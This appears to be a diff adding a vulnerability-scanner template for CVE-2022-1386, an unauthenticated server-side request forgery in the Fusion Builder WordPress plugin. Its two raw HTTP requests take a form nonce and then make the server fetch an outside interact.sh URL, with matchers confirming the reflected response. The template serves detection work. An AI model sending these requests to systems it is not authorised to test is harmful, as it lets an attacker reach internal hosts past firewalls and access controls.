@@ -1,0 +1,181 @@
+id: CVE-2022-1386
+
+info:
+
+  name: Fusion Builder < 3.6.2 - Unauthenticated SSRF
+
+  author: akincibor,MantisSTS,calumjelrick
+
+  severity: critical
+
+  description: The plugin, used in the Avada theme, does not validate a parameter in its forms which could be used to initiate arbitrary HTTP requests. The data returned is then reflected back in the application's response. This could be used to interact with hosts on the server's local network bypassing firewalls and access control measures.
+
+  reference:
+
+    - https://wpscan.com/vulnerability/bf7034ab-24c4-461f-a709-3f73988b536b
+
+  tags: wp,wordpress,ssrf,fusion,themefusion,avada
+
+requests:
+
+  - raw:
+
+      - |
+
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+
+        Host: {{Hostname}}
+
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+
+        Accept-Language: en-US,en;q=0.5
+
+        Accept-Encoding: gzip, deflate
+
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        X-Requested-With: XMLHttpRequest
+
+        Sec-Fetch-Dest: empty
+
+        Sec-Fetch-Mode: cors
+
+        Sec-Fetch-Site: same-origin
+
+        Te: trailers
+
+        Origin: {{BaseURL}}
+
+        Referer: {{RootURL}}
+
+        action=fusion_form_update_view
+
+      - |
+
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+
+        Host: {{Hostname}}
+
+        User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+        Accept: application/json, text/javascript, */*; q=0.01
+
+        Accept-Language: en-US,en;q=0.5
+
+        Accept-Encoding: gzip, deflate
+
+        X-Requested-With: XMLHttpRequest
+
+        Content-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268
+
+        Content-Length: 1403
+
+        Origin: {{BaseURL}}
+
+        Referer: {{RootURL}}
+
+        Sec-Fetch-Dest: empty
+
+        Sec-Fetch-Mode: cors
+
+        Sec-Fetch-Site: same-origin
+
+        Te: trailers
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="formData"
+
+        email=example%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva
+
+        cy_expiration_action=ignore&fusion-form-nonce-0={{fusionformnonce}}&fusion-fields-hold-private-data=
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="action"
+
+        fusion_form_submit_form_to_url
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="fusion_form_nonce"
+
+        {{fusionformnonce}}
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="form_id"
+
+        0
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="post_id"
+
+        0
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="field_labels"
+
+        {"email":"Email address"}
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="hidden_field_names"
+
+        []
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="fusionAction"
+
+        http://interact.sh/
+
+        -----------------------------30259827232283860776499538268
+
+        Content-Disposition: form-data; name="fusionActionMethod"
+
+        GET
+
+        -----------------------------30259827232283860776499538268--
+
+    req-condition: true
+
+    extractors:
+
+      - type: xpath
+
+        part: body_1
+
+        name: fusionformnonce
+
+        attribute: value
+
+        xpath:
+
+          - '//*[@id="fusion-form-nonce-0"]'
+
+        internal: true
+
+    matchers-condition: and
+
+    matchers:
+
+      - type: word
+
+        part: body_2
+
+        words:
+
+          - '<h1> Interactsh Server <\/h1>'
+
+          - '<h1> Interactsh Server </h1>'
+
+        condition: or
+
+      - type: status
+
+        status:
+
+          - 200
